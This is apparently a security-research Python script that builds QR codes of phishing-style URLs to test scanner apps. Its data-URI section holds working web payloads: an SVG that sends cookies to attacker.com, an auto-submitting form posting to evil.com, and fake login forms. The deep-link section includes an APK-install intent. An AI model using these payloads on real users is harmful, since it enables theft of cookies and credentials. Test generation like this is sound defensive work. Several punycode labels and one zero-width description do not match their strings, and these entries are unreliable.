#!/usr/bin/env python3
"""
QR Phishing Test Suite Generator
================================
Script untuk generate QR test cases untuk pengujian keamanan
aplikasi barcode scanner terhadap serangan phishing.

Author: Research Assistant
Purpose: Academic Research - Mobile Security
"""

import qrcode
import os
import json
import csv
from datetime import datetime
from urllib.parse import urlparse
import random

class QRTestCaseGenerator:
    """
    Generator untuk membuat QR test cases untuk pengujian deteksi phishing
    pada aplikasi barcode scanner
    """

    def __init__(self, output_dir="qr_test_cases"):
        self.output_dir = output_dir
        self.images_dir = f"{output_dir}/images"
        self.data_dir = f"{output_dir}/data"
        self.test_cases = []
        self.case_counter = 0

        # Buat folder
        os.makedirs(self.images_dir, exist_ok=True)
        os.makedirs(self.data_dir, exist_ok=True)

        # Kategori test cases
        self.categories = {
            "legitimate": "URL Legitim (Control Group)",
            "url_shortener": "URL Shortener (Potentially Dangerous)",
            "homograph": "Homograph Attack (IDN Spoofing)",
            "ip_based": "IP-Based URLs (Suspicious)",
            "suspicious_tld": "Suspicious TLDs",
            "typosquatting": "Typosquatting (Brand Impersonation)",
            "data_uri": "Data URI (Embedded Content)",
            "deep_link": "Deep Links / Intent URLs",
            "mixed_content": "Mixed Content / HTTP",
            "excessive_subdomain": "Excessive Subdomains",
            "special_chars": "Special Characters in Domain",
            "zero_width": "Zero-Width Characters",
            "punycode": "Punycode Encoding",
            "redirect_chain": "Redirect Chains",
            "credential_harvesting": "Credential Harvesting Patterns"
        }

    def generate_qr(self, data, filename, category, description, risk_level):
        """Generate QR code dan simpan metadata"""
        self.case_counter += 1
        case_id = f"QR_{self.case_counter:04d}"

        # Generate QR code
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(data)
        qr.make(fit=True)

        # Save image
        img = qr.make_image(fill_color="black", back_color="white")
        img_path = f"{self.images_dir}/{case_id}_{filename}.png"
        img.save(img_path)

        # Simpan metadata
        test_case = {
            "case_id": case_id,
            "category": category,
            "category_name": self.categories.get(category, "Unknown"),
            "data": data,
            "filename": f"{case_id}_{filename}.png",
            "description": description,
            "risk_level": risk_level,
            "created_at": datetime.now().isoformat(),
            "expected_behavior": self._get_expected_behavior(risk_level),
            "test_result": None,
            "notes": ""
        }

        self.test_cases.append(test_case)
        return test_case

    def _get_expected_behavior(self, risk_level):
        behaviors = {
            "low": "URL dianggap aman, tidak ada warning",
            "medium": "Warning ringan atau konfirmasi user",
            "high": "Warning kuat dengan detail ancaman",
            "critical": "Blokir total atau sangat sulit untuk proceed"
        }
        return behaviors.get(risk_level, "Unknown")

    def generate_all(self):
        """Generate semua kategori test cases"""
        print("\n🚀 Memulai generate QR test cases...\n")

        # 1. Legitimate URLs (Control Group)
        print("📦 Generating: Legitimate URLs...")
        legitimate_urls = [
            ("https://www.google.com", "Google Homepage", "low"),
            ("https://www.amazon.com", "Amazon E-commerce", "low"),
            ("https://www.microsoft.com", "Microsoft Official", "low"),
            ("https://www.apple.com", "Apple Official", "low"),
            ("https://github.com", "GitHub Platform", "low"),
            ("https://www.wikipedia.org", "Wikipedia", "low"),
            ("https://www.linkedin.com", "LinkedIn Professional", "low"),
            ("https://www.reddit.com", "Reddit Community", "low"),
            ("https://www.netflix.com", "Netflix Streaming", "low"),
            ("https://www.spotify.com", "Spotify Music", "low"),
            ("https://www.adobe.com", "Adobe Software", "low"),
            ("https://www.salesforce.com", "Salesforce CRM", "low"),
            ("https://www.shopify.com", "Shopify E-commerce", "low"),
            ("https://www.dropbox.com", "Dropbox Cloud", "low"),
            ("https://www.slack.com", "Slack Messaging", "low"),
            ("https://www.zoom.us", "Zoom Video", "low"),
            ("https://www.figma.com", "Figma Design", "low"),
            ("https://www.notion.so", "Notion Workspace", "low"),
            ("https://www.trello.com", "Trello Project", "low"),
            ("https://www.atlassian.com", "Atlassian Suite", "low"),
        ]
        for url, desc, risk in legitimate_urls:
            self.generate_qr(url, f"legit_{len([c for c in self.test_cases if c['category']=='legitimate'])+1}", "legitimate", desc, risk)
        print(f"   ✅ 20 cases generated")

        # 2. URL Shorteners
        print("📦 Generating: URL Shorteners...")
        shortener_domains = ["bit.ly", "tinyurl.com", "t.co", "goo.gl", "ow.ly", "short.link", "is.gd", "buff.ly", "rebrand.ly", "cutt.ly", "shorturl.at", "rb.gy", "short.io", "bl.ink", "t2m.io"]
        for i in range(30):
            domain = random.choice(shortener_domains)
            code = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=7))
            url = f"https://{domain}/{code}"
            self.generate_qr(url, f"short_{i+1}", "url_shortener", f"URL Shortener: {domain}", "medium")
        print(f"   ✅ 30 cases generated")

        # 3. Homograph Attacks
        print("📦 Generating: Homograph Attacks...")
        homographs = [
            ("https://gоogle.com", "Google dengan Cyrillic 'о' (U+043E)"),
            ("https://раypal.com", "PayPal dengan Cyrillic characters"),
            ("https://micrоsоft.com", "Microsoft dengan Cyrillic 'о'"),
            ("https://facebоok.com", "Facebook dengan Cyrillic 'о'"),
            ("https://аmazon.com", "Amazon dengan Cyrillic 'а'"),
            ("https://аpple.com", "Apple dengan Cyrillic 'а'"),
            ("https://netflіx.com", "Netflix dengan Ukrainian 'і'"),
            ("https://lіnkedin.com", "LinkedIn dengan Ukrainian 'і'"),
            ("https://twіtter.com", "Twitter dengan Ukrainian 'і'"),
            ("https://іnstagram.com", "Instagram dengan Ukrainian 'і'"),
            ("https://whаtsapp.com", "WhatsApp dengan Cyrillic 'а'"),
            ("https://telegрам.org", "Telegram dengan Cyrillic characters"),
            ("https://gіthub.com", "GitHub dengan Ukrainian 'і'"),
            ("https://drоpbox.com", "Dropbox dengan Cyrillic 'о'"),
            ("https://slаck.com", "Slack dengan Cyrillic 'а'"),
            ("https://zоom.us", "Zoom dengan Cyrillic 'о'"),
            ("https://adоbe.com", "Adobe dengan Cyrillic 'о'"),
            ("https://sаlesforce.com", "Salesforce dengan Cyrillic 'а'"),
            ("https://shоpify.com", "Shopify dengan Cyrillic 'о'"),
            ("https://wіkimedia.org", "Wikimedia dengan Ukrainian 'і'"),
            ("https://medіum.com", "Medium dengan Ukrainian 'і'"),
            ("https://medіafire.com", "MediaFire dengan Ukrainian 'і'"),
            ("https://flicкr.com", "Flickr dengan Cyrillic 'к'"),
            ("https://vіmeo.com", "Vimeo dengan Ukrainian 'і'"),
            ("https://sоundcloud.com", "SoundCloud dengan Cyrillic 'о'"),
        ]
        for url, desc in homographs:
            self.generate_qr(url, f"homo_{len([c for c in self.test_cases if c['category']=='homograph'])+1}", "homograph", desc, "critical")
        print(f"   ✅ 25 cases generated")

        # 4. IP-Based URLs
        print("📦 Generating: IP-Based URLs...")
        ip_urls = [
            ("http://192.168.1.1/login", "Local router login"),
            ("http://10.0.0.1/admin", "Private network admin"),
            ("http://172.16.0.1/portal", "Private IP portal"),
            ("http://127.0.0.1/phishing", "Localhost suspicious"),
            ("http://0.0.0.0/malicious", "Wildcard IP"),
            ("http://255.255.255.255/attack", "Broadcast IP"),
            ("http://192.168.0.1/bank-login", "Fake bank on local IP"),
            ("http://10.10.10.10/paypal", "Fake PayPal on private IP"),
            ("http://172.31.255.255/signin", "AWS VPC IP range"),
            ("http://198.51.100.1/secure", "TEST-NET-2 IP"),
            ("http://203.0.113.5/banking", "TEST-NET-3 IP"),
            ("http://192.0.2.10/login", "TEST-NET-1 IP"),
            ("http://100.64.0.1/portal", "CGNAT IP range"),
            ("http://169.254.1.1/config", "Link-local address"),
            ("http://198.18.0.1/admin", "Benchmark testing IP"),
            ("http://240.0.0.1/reserved", "Reserved IP"),
            ("http://225.1.1.1/multicast", "Multicast IP"),
            ("http://192.88.99.1/relay", "6to4 Relay Anycast"),
            ("http://192.168.100.1/router", "Common router IP"),
            ("http://10.1.1.1/gateway", "Common gateway IP"),
        ]
        for url, desc in ip_urls:
            self.generate_qr(url, f"ip_{len([c for c in self.test_cases if c['category']=='ip_based'])+1}", "ip_based", desc, "high")
        print(f"   ✅ 20 cases generated")

        # 5. Suspicious TLDs
        print("📦 Generating: Suspicious TLDs...")
        suspicious_tlds = [".tk", ".ml", ".ga", ".cf", ".gq", ".xyz", ".top", ".club", ".online", ".site", ".icu", ".cyou", ".work", ".live", ".digital", ".click", ".link", ".download", ".racing", ".win", ".date", ".faith", ".loan", ".men", ".party"]
        keywords = ["login", "secure", "bank", "verify", "account", "update", "confirm", "auth"]
        brands = ["paypal", "apple", "microsoft", "amazon", "google", "facebook", "netflix", "bank"]
        for i in range(25):
            brand = random.choice(brands)
            keyword = random.choice(keywords)
            tld = random.choice(suspicious_tlds)
            subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
            url = f"https://{keyword}-{brand}-{subdomain}{tld}"
            self.generate_qr(url, f"tld_{i+1}", "suspicious_tld", f"Suspicious TLD: {tld}", "high")
        print(f"   ✅ 25 cases generated")

        # 6. Typosquatting
        print("📦 Generating: Typosquatting...")
        typos = [
            ("https://paypa1.com", "PayPal dengan angka '1'"),
            ("https://gogle.com", "Google tanpa 'o'"),
            ("https://gooogle.com", "Google dengan triple 'o'"),
            ("https://amaz0n.com", "Amazon dengan angka '0'"),
            ("https://arnazon.com", "Amazon dengan 'rn' -> 'm'"),
            ("https://facebok.com", "Facebook tanpa 'o'"),
            ("https://faceboook.com", "Facebook dengan triple 'o'"),
            ("https://twltter.com", "Twitter dengan 'l' -> 'i'"),
            ("https://twittter.com", "Twitter dengan triple 't'"),
            ("https://instagran.com", "Instagram dengan 'n' -> 'm'"),
            ("https://instagrarn.com", "Instagram dengan 'rn' -> 'm'"),
            ("https://linkediin.com", "LinkedIn dengan double 'i'"),
            ("https://lnkedin.com", "LinkedIn tanpa 'i'"),
            ("https://netflx.com", "Netflix tanpa 'i'"),
            ("https://netfliix.com", "Netflix dengan double 'i'"),
            ("https://micr0soft.com", "Microsoft dengan angka '0'"),
            ("https://micros0ft.com", "Microsoft dengan angka '0'"),
            ("https://aple.com", "Apple tanpa 'p'"),
            ("https://appple.com", "Apple dengan triple 'p'"),
            ("https://amazom.com", "Amazon dengan 'm' -> 'n'"),
            ("https://arnazon.com", "Amazon dengan 'rn' -> 'm'"),
            ("https://you tube.com", "YouTube dengan spasi"),
            ("https://youtubee.com", "YouTube dengan double 'e'"),
            ("https://whatsapps.com", "WhatsApp dengan 's'"),
            ("https://whatapp.com", "WhatsApp tanpa 's'"),
            ("https://telegrarn.com", "Telegram dengan 'rn' -> 'm'"),
            ("https://teiegram.com", "Telegram dengan 'ie' -> 'le'"),
            ("https://githubb.com", "GitHub dengan double 'b'"),
            ("https://githhub.com", "GitHub dengan double 'h'"),
            ("https://dropboxx.com", "Dropbox dengan double 'x'"),
        ]
        for url, desc in typos:
            self.generate_qr(url, f"typo_{len([c for c in self.test_cases if c['category']=='typosquatting'])+1}", "typosquatting", desc, "critical")
        print(f"   ✅ 30 cases generated")

        # 7. Data URIs
        print("📦 Generating: Data URIs...")
        data_uris = [
            ("data:text/html,<script>alert('XSS Attack')</script>", "XSS via Data URI"),
            ("data:text/html,<h1>Phishing Page</h1><form><input type='password' name='pass'></form>", "Fake login form"),
            ("data:text/html,<meta http-equiv='refresh' content='0; url=https://evil.com'>", "Meta refresh redirect"),
            ("data:text/html,<iframe src='https://banking-site.com' style='width:100%;height:100%'></iframe>", "Clickjacking iframe"),
            ("data:text/html,<body onload='document.forms[0].submit()'><form action='https://evil.com/steal' method='POST'><input name='data' value='stolen'></form>", "Auto-submit form"),
            ("data:text/html,<script>window.location='https://phishing-site.com/login'</script>", "JavaScript redirect"),
            ("data:text/html,<base href='https://legitimate-looking.com/'><img src='logo.png'>", "Base tag manipulation"),
            ("data:text/html,<svg onload='fetch(\"https://attacker.com/steal?c=\"+document.cookie)'>", "SVG XSS"),
            ("data:text/html,<input type='text' value='password' onfocus='this.type=\"password\"'>", "Credential harvesting form"),
            ("data:text/html,<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white'><h1>Security Alert</h1><p>Your account has been compromised. Click <a href=\"https://evil.com\">here</a> to secure it.</p></div>", "Fake security alert"),
            ("data:text/html,<script>document.write('<h1>'+document.domain+'</h1>')</script>", "Domain disclosure test"),
            ("data:text/html,<form action='https://evil.com/phish' autocomplete='on'><input name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'><button>Login</button></form>", "Credential autocomplete harvesting"),
            ("data:text/html,<script>history.pushState({}, '', '/bank/login')</script>", "URL spoofing via history API"),
            ("data:text/html,<a href='javascript:alert(document.domain)'>Click here</a>", "JavaScript protocol link"),
            ("data:text/html,<object data='https://evil.com/malware.swf'>", "Malicious object embedding"),
        ]
        for data, desc in data_uris:
            self.generate_qr(data, f"data_{len([c for c in self.test_cases if c['category']=='data_uri'])+1}", "data_uri", desc, "critical")
        print(f"   ✅ 15 cases generated")

        # 8. Deep Links
        print("📦 Generating: Deep Links...")
        deep_links = [
            ("intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end", "ZXing Intent"),
            ("intent://settings/#Intent;action=android.settings.SETTINGS;end", "Open Settings"),
            ("intent://tel/#Intent;action=android.intent.action.DIAL;data=tel:1234567890;end", "Dial phone number"),
            ("intent://sms/#Intent;action=android.intent.action.SENDTO;data=sms:1234567890;end", "Send SMS"),
            ("intent://email/#Intent;action=android.intent.action.SEND;type=text/plain;end", "Send email"),
            ("market://details?id=com.malicious.app", "Open Play Store (malicious app)"),
            ("intent://wifi/#Intent;action=android.settings.WIFI_SETTINGS;end", "Open WiFi settings"),
            ("intent://bluetooth/#Intent;action=android.settings.BLUETOOTH_SETTINGS;end", "Open Bluetooth settings"),
            ("intent://location/#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end", "Open Location settings"),
            ("intent://security/#Intent;action=android.settings.SECURITY_SETTINGS;end", "Open Security settings"),
            ("intent://app/#Intent;action=android.intent.action.MAIN;component=com.malicious/.MainActivity;end", "Launch malicious activity"),
            ("intent://install/#Intent;action=android.intent.action.VIEW;data=file:///sdcard/malware.apk;type=application/vnd.android.package-archive;end", "Install APK"),
            ("intent://camera/#Intent;action=android.media.action.IMAGE_CAPTURE;end", "Open Camera"),
            ("intent://contacts/#Intent;action=android.intent.action.PICK;type=vnd.android.cursor.dir/contact;end", "Access Contacts"),
            ("intent://calendar/#Intent;action=android.intent.action.INSERT;type=vnd.android.cursor.dir/event;end", "Add Calendar Event"),
        ]
        for url, desc in deep_links:
            self.generate_qr(url, f"deep_{len([c for c in self.test_cases if c['category']=='deep_link'])+1}", "deep_link", desc, "high")
        print(f"   ✅ 15 cases generated")

        # 9. Mixed Content
        print("📦 Generating: Mixed Content...")
        mixed_urls = [
            ("http://login.paypal.com.phishing-site.com/secure", "HTTP dengan subdomain phishing"),
            ("http://secure-banking-login.com/verify", "HTTP dengan nama misleading"),
            ("http://account-verification.net/update", "HTTP verification site"),
            ("http://login.microsoft.com.evil.com/phish", "HTTP dengan subdomain chain"),
            ("http://auth.google.com.malicious.org/login", "HTTP dengan brand impersonation"),
            ("http://www.paypal.com@evil.com/login", "HTTP dengan @ redirect"),
            ("http://apple.com:password@phishing.com/secure", "HTTP dengan credential in URL"),
            ("http://facebook.com%2F%2F%40phishing.com", "HTTP dengan URL encoding"),
            ("http://amazon.co.jp.security-update.com/login", "HTTP dengan TLD confusion"),
            ("http://netflix.com.account.verify.tk/secure", "HTTP dengan free TLD"),
            ("http://login@banking-site.com:password@evil.com", "HTTP dengan double credential"),
            ("http://legitimate-looking.com//evil.com/phish", "HTTP dengan double slash"),
            ("http://google.com..evil.com/redirect", "HTTP dengan double dot"),
            ("http://yahoo.com%00evil.com", "HTTP dengan null byte"),
            ("http://microsoft.com?redirect=evil.com", "HTTP dengan query redirect"),
        ]
        for url, desc in mixed_urls:
            self.generate_qr(url, f"mixed_{len([c for c in self.test_cases if c['category']=='mixed_content'])+1}", "mixed_content", desc, "high")
        print(f"   ✅ 15 cases generated")

        # 10. Excessive Subdomains
        print("📦 Generating: Excessive Subdomains...")
        excessive_urls = [
            ("https://www.login.secure.account.update.verify.paypal.com.phishing.com", "Excessive subdomains PayPal"),
            ("https://auth.login.secure.banking.account.verify.update.microsoft.com.evil.com", "Excessive subdomains Microsoft"),
            ("https://www.secure.login.account.billing.payment.amazon.com.malicious.com", "Excessive subdomains Amazon"),
            ("https://login.account.security.verification.update.confirm.facebook.com.phish.com", "Excessive subdomains Facebook"),
            ("https://secure.auth.login.banking.account.verify.apple.com.evil.org", "Excessive subdomains Apple"),
            ("https://www.login.secure.account.billing.netflix.com.phishing.tk", "Excessive subdomains Netflix"),
            ("https://auth.login.secure.account.update.verify.google.com.malicious.xyz", "Excessive subdomains Google"),
            ("https://login.secure.account.billing.payment.update.linkedin.com.evil.ml", "Excessive subdomains LinkedIn"),
            ("https://www.auth.login.secure.account.verify.twitter.com.phish.ga", "Excessive subdomains Twitter"),
            ("https://secure.login.account.billing.verification.instagram.com.malicious.cf", "Excessive subdomains Instagram"),
            ("https://login.secure.account.update.verify.whatsapp.com.phishing.gq", "Excessive subdomains WhatsApp"),
            ("https://auth.login.secure.banking.account.payment.telegram.org.evil.tk", "Excessive subdomains Telegram"),
            ("https://www.login.secure.account.billing.github.com.malicious.ml", "Excessive subdomains GitHub"),
            ("https://secure.auth.login.account.verify.dropbox.com.phish.xyz", "Excessive subdomains Dropbox"),
            ("https://login.secure.account.update.verification.slack.com.evil.top", "Excessive subdomains Slack"),
        ]
        for url, desc in excessive_urls:
            self.generate_qr(url, f"sub_{len([c for c in self.test_cases if c['category']=='excessive_subdomain'])+1}", "excessive_subdomain", desc, "high")
        print(f"   ✅ 15 cases generated")

        # 11. Special Characters
        print("📦 Generating: Special Characters...")
        special_urls = [
            ("https://paypa|l.com", "Pipe character in domain"),
            ("https://go0gle.com", "Zero instead of 'o'"),
            ("https://amaz0n.com", "Zero instead of 'o'"),
            ("https://faceb00k.com", "Double zero"),
            ("https://tw1tter.com", "One instead of 'i'"),
            ("https://instagr4m.com", "Four instead of 'a'"),
            ("https://l1nkedin.com", "One instead of 'i'"),
            ("https://netfl1x.com", "One instead of 'i'"),
            ("https://m1crosoft.com", "One instead of 'i'"),
            ("https://appl3.com", "Three instead of 'e'"),
            ("https://g00gle.com", "Double zero"),
            ("https://y4hoo.com", "Four instead of 'a'"),
            ("https://redd1t.com", "One instead of 'i'"),
            ("https://p1nterest.com", "One instead of 'i'"),
            ("https://tumb1r.com", "One instead of 'l'"),
        ]
        for url, desc in special_urls:
            self.generate_qr(url, f"spec_{len([c for c in self.test_cases if c['category']=='special_chars'])+1}", "special_chars", desc, "high")
        print(f"   ✅ 15 cases generated")

        # 12. Zero-Width Characters
        print("📦 Generating: Zero-Width Characters...")
        zero_width = [
            ("https://g\u200Boogle.com", "Zero-width space in Google"),
            ("https://pay\u200Cpal.com", "Zero-width non-joiner in PayPal"),
            ("https://amaz\u200Don.com", "Zero-width joiner in Amazon"),
            ("https://faceb\u200Book.com", "Zero-width space in Facebook"),
            ("https://twi\u200Ctter.com", "Zero-width non-joiner in Twitter"),
            ("https://insta\u200Dgram.com", "Zero-width joiner in Instagram"),
            ("https://link\u200Bedin.com", "Zero-width space in LinkedIn"),
            ("https://netf\u200Clix.com", "Zero-width non-joiner in Netflix"),
            ("https://micr\u200Dosoft.com", "Zero-width space in Microsoft"),
            ("https://appl\u200De.com", "Zero-width joiner in Apple"),
        ]
        for url, desc in zero_width:
            self.generate_qr(url, f"zw_{len([c for c in self.test_cases if c['category']=='zero_width'])+1}", "zero_width", desc, "critical")
        print(f"   ✅ 10 cases generated")

        # 13. Punycode
        print("📦 Generating: Punycode...")
        punycode_urls = [
            ("https://xn--ggle-wmc.com", "Punycode: gооgle (Cyrillic)"),
            ("https://xn--pypal-4ve.com", "Punycode: раypal (Cyrillic)"),
            ("https://xn--amzon-wmc.com", "Punycode: аmazon (Cyrillic)"),
            ("https://xn--fcbook-9ve.com", "Punycode: fаcebook (Cyrillic)"),
            ("https://xn--twtter-6ve.com", "Punycode: twіtter (Cyrillic)"),
            ("https://xn--instgram-9ve.com", "Punycode: іnstagram (Cyrillic)"),
            ("https://xn--lnkedin-9ve.com", "Punycode: lіnkedin (Cyrillic)"),
            ("https://xn--netflx-9ve.com", "Punycode: netflіx (Cyrillic)"),
            ("https://xn--micrsoft-9ve.com", "Punycode: mіcrosoft (Cyrillic)"),
            ("https://xn--aple-wmc.com", "Punycode: аpple (Cyrillic)"),
            ("https://xn--gthub-9ve.com", "Punycode: gіthub (Cyrillic)"),
            ("https://xn--drpbox-9ve.com", "Punycode: dropbox (Cyrillic)"),
            ("https://xn--slck-9ve.com", "Punycode: slаck (Cyrillic)"),
            ("https://xn--zom-wmc.com", "Punycode: zоom (Cyrillic)"),
            ("https://xn--adbe-wmc.com", "Punycode: аdobe (Cyrillic)"),
        ]
        for url, desc in punycode_urls:
            self.generate_qr(url, f"puny_{len([c for c in self.test_cases if c['category']=='punycode'])+1}", "punycode", desc, "critical")
        print(f"   ✅ 15 cases generated")

        # 14. Redirect Chains
        print("📦 Generating: Redirect Chains...")
        redirect_urls = [
            ("https://bit.ly/3xyz123", "Bit.ly redirect"),
            ("https://tinyurl.com/y7abc123", "TinyURL redirect"),
            ("https://t.co/xyz123", "Twitter shortener"),
            ("https://ow.ly/abc123", "Hootsuite shortener"),
            ("https://short.link/xyz", "Generic shortener"),
            ("https://rebrand.ly/phish123", "Rebrandly redirect"),
            ("https://cutt.ly/xyzABC", "Cuttly redirect"),
            ("https://rb.gy/abc123", "RB.GY shortener"),
            ("https://shorturl.at/xyzAB", "ShortURL redirect"),
            ("https://is.gd/abc123", "Is.gd shortener"),
            ("https://buff.ly/3xyz123", "Buffer shortener"),
            ("https://t2m.io/xyz123", "T2M shortener"),
            ("https://bl.ink/xyz123", "BL.INK shortener"),
            ("https://short.io/xyz123", "Short.io redirect"),
            ("https://clickmeter.com/tracking/xyz123", "ClickMeter tracking"),
        ]
        for url, desc in redirect_urls:
            self.generate_qr(url, f"redir_{len([c for c in self.test_cases if c['category']=='redirect_chain'])+1}", "redirect_chain", desc, "medium")
        print(f"   ✅ 15 cases generated")

        # 15. Credential Harvesting
        print("📦 Generating: Credential Harvesting...")
        credential_urls = [
            ("https://login-paypal-secure-verify.com/account/update", "Fake PayPal login"),
            ("https://appleid-secure-verification.com/signin", "Fake Apple ID login"),
            ("https://microsoft-account-verify.com/login", "Fake Microsoft login"),
            ("https://amazon-secure-login.com/account/update", "Fake Amazon login"),
            ("https://facebook-security-check.com/login", "Fake Facebook login"),
            ("https://netflix-account-verify.com/login", "Fake Netflix login"),
            ("https://google-account-security.com/signin", "Fake Google login"),
            ("https://linkedin-secure-login.com/signin", "Fake LinkedIn login"),
            ("https://twitter-account-verify.com/login", "Fake Twitter login"),
            ("https://instagram-security-check.com/login", "Fake Instagram login"),
            ("https://whatsapp-web-login.com/verify", "Fake WhatsApp login"),
            ("https://telegram-login-verify.com/signin", "Fake Telegram login"),
            ("https://github-secure-login.com/session", "Fake GitHub login"),
            ("https://dropbox-login-verify.com/signin", "Fake Dropbox login"),
            ("https://slack-secure-login.com/signin", "Fake Slack login"),
            ("https://zoom-account-verify.com/login", "Fake Zoom login"),
            ("https://adobe-account-secure.com/signin", "Fake Adobe login"),
            ("https://salesforce-login-verify.com/login", "Fake Salesforce login"),
            ("https://shopify-account-secure.com/login", "Fake Shopify login"),
            ("https://spotify-login-verify.com/signin", "Fake Spotify login"),
        ]
        for url, desc in credential_urls:
            self.generate_qr(url, f"cred_{len([c for c in self.test_cases if c['category']=='credential_harvesting'])+1}", "credential_harvesting", desc, "critical")
        print(f"   ✅ 20 cases generated")

        return self.test_cases

    def save_metadata(self):
        """Simpan metadata ke JSON dan CSV"""
        json_path = f"{self.data_dir}/test_cases_metadata.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump({
                "generated_at": datetime.now().isoformat(),
                "total_cases": len(self.test_cases),
                "categories": self.categories,
                "test_cases": self.test_cases
            }, f, indent=2, ensure_ascii=False)

        csv_path = f"{self.data_dir}/test_cases_metadata.csv"
        with open(csv_path, 'w', newline='', encoding='utf-8') as f:
            if self.test_cases:
                writer = csv.DictWriter(f, fieldnames=self.test_cases[0].keys())
                writer.writeheader()
                writer.writerows(self.test_cases)

        print(f"\n💾 Metadata saved:")
        print(f"   📄 JSON: {json_path}")
        print(f"   📊 CSV: {csv_path}")

        return json_path, csv_path

    def generate_report(self):
        """Generate summary report"""
        report = []
        report.append("=" * 60)
        report.append("QR TEST CASES GENERATION REPORT")
        report.append("=" * 60)
        report.append(f"Generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Total test cases: {len(self.test_cases)}")
        report.append("")

        category_counts = {}
        risk_counts = {"low": 0, "medium": 0, "high": 0, "critical": 0}

        for case in self.test_cases:
            cat = case['category']
            risk = case['risk_level']
            category_counts[cat] = category_counts.get(cat, 0) + 1
            risk_counts[risk] = risk_counts.get(risk, 0) + 1

        report.append("BY CATEGORY:")
        report.append("-" * 40)
        for cat, count in sorted(category_counts.items()):
            report.append(f"  {cat:25s}: {count:3d} cases")

        report.append("")
        report.append("BY RISK LEVEL:")
        report.append("-" * 40)
        for risk, count in risk_counts.items():
            report.append(f"  {risk:10s}: {count:3d} cases")

        report.append("")
        report.append("OUTPUT LOCATIONS:")
        report.append("-" * 40)
        report.append(f"  Images: {self.images_dir}/")
        report.append(f"  Data:   {self.data_dir}/")

        report_text = "\n".join(report)

        report_path = f"{self.data_dir}/generation_report.txt"
        with open(report_path, 'w') as f:
            f.write(report_text)

        return report_text, report_path


def main():
    """Main function"""
    print("=" * 60)
    print("QR PHISHING TEST SUITE GENERATOR")
    print("=" * 60)
    print("\n🎯 This script will generate 285 QR test cases")
    print("   for testing barcode scanner security against phishing\n")

    # Create generator
    generator = QRTestCaseGenerator()

    # Generate all test cases
    test_cases = generator.generate_all()

    # Save metadata
    json_path, csv_path = generator.save_metadata()

    # Generate report
    report_text, report_path = generator.generate_report()
    print("\n" + report_text)
    print(f"\n📋 Report saved: {report_path}")

    print("\n" + "=" * 60)
    print("✅ GENERATION COMPLETE!")
    print("=" * 60)
    print(f"\n📁 Output folder: {generator.output_dir}/")
    print(f"📊 Total test cases: {len(test_cases)}")
    print("\n📝 Next steps:")
    print("   1. Test each QR code with your barcode scanner app")
    print("   2. Record results using testing_helper.py")
    print("   3. Generate test report")
    print("\n📖 See README.md for detailed instructions")


if __name__ == "__main__":
    main()
